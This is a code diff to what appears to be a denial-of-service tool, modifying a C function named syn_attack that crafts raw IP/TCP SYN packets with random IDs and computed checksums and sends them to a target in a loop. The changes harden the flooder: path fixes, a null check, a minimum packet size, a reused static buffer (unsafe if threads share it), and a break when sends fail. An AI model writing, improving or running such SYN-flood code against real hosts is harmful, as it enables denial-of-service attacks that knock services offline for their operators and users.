@@ -1,5 +1,5 @@
-#include "syn_attack.h"
-#include "checksum.h"
+#include "headers/syn_attack.h"
+#include "headers/checksum.h"
 #include <string.h>
 #include <stdlib.h>
 #include <arpa/inet.h>
@@ -11,6 +11,7 @@
 
 void* syn_attack(void* arg) {
     attack_params* params = (attack_params*)arg;
+    if (!params) return NULL;
 
     int syn_sock = socket(AF_INET, SOCK_RAW, IPPROTO_TCP);
     if (syn_sock < 0) {
@@ -21,13 +22,21 @@ void* syn_attack(void* arg) {
     const int *val = &one;
     setsockopt(syn_sock, IPPROTO_IP, IP_HDRINCL, val, sizeof(one));
 
-    int packet_size = params->psize > 0 ? params->psize : 32;
-    unsigned char *packet = malloc(packet_size);
-    if (!packet) {
-        close(syn_sock);
-        return NULL;
+    int min_packet_size = sizeof(struct iphdr) + sizeof(struct tcphdr);
+    int packet_size = params->psize > 0 ? params->psize : 40;
+    if (packet_size < min_packet_size) packet_size = min_packet_size;
+    static unsigned char *packet = NULL;
+    static int last_packet_size = 0;
+    if (packet == NULL || last_packet_size != packet_size) {
+        if (packet) free(packet);
+        packet = malloc(packet_size);
+        if (!packet) {
+            close(syn_sock);
+            return NULL;
+        }
+        memset(packet, 0, min_packet_size);
+        last_packet_size = packet_size;
     }
-    memset(packet, 0x00, packet_size);
 
     struct iphdr* iph = (struct iphdr*) packet;
     struct tcphdr* tcph = (struct tcphdr*) (packet + sizeof(struct iphdr));
@@ -68,10 +77,10 @@ void* syn_attack(void* arg) {
         iph->id = htons(rand() % 65535);
         iph->check = generic_checksum((unsigned short*)iph, sizeof(struct iphdr));
         tcph->check = tcp_udp_checksum(tcph, sizeof(struct tcphdr), iph->saddr, iph->daddr, IPPROTO_TCP);
-        sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
+        ssize_t sent = sendto(syn_sock, packet, packet_size, 0, (struct sockaddr*)&dest, sizeof(dest));
+        if (sent < 0) break;
     }
 
-    free(packet);
     close(syn_sock);
     return NULL;
 }
